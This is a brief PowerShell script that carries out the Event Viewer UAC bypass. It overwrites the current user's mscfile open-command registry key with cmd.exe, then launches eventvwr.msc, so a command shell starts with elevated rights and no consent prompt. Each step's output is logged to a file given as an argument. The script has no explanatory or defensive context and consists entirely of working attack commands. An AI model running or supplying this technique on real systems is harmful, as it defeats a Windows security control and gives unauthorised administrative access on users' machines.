"**********************************************************************************************" | Out-File -FilePath $args[0]
cmd.exe /c 'reg.exe add hkcu\software\classes\mscfile\shell\open\command /ve /d cmd.exe /f' | Out-File -FilePath $args[0] -Append
cmd.exe /c 'cmd.exe /c eventvwr.msc' | Out-File -FilePath $args[0] -Append